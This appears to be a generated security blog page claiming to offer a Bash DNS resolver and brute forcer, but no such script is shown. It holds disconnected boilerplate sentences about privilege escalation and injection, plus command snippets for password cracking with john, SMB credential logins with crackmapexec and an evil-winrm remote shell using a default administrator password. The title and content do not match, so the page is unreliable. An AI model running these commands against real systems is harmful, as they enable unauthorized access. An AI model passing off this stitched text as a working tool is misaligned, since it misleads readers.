---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "powershell, c, script, bash, fuzzer, rust"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-136.html"
URL_IMAGES: ""
Date: "2024-05-17"
Tags: "PowerShell, C, Script, Bash, Fuzzer, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-136"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-136.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `john`
- `smbclient`
- `smbclient`

## Implementation

### Core Logic

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```bash
nmap -sCV -p143,23,443 10.33.81.27 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.75.178.103 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.61.78.79 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
crackmapexec smb 10.103.100.40 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.100.115.159 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 14.14s
```
